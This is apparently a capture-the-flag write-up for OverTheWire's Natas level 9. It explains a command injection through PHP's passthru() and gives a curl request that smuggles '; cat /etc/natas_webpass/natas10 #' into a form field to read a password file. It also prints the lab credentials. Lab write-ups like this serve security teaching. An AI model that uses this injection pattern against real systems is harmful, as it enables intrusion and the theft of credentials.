
# Flag
natas10:nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu

This one is tricky, though the vulnerability is pretty easy to spot.
The php code takes in the input and uses passthru() to execute shell commands.

If we intercept that with a semicolon ";", we can execute our command after that:

curl --user natas9:W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl "http://natas9.natas.labs.overthewire.org/" -F needle="something; cat /etc/natas_webpass/natas10 #" -F submit=Search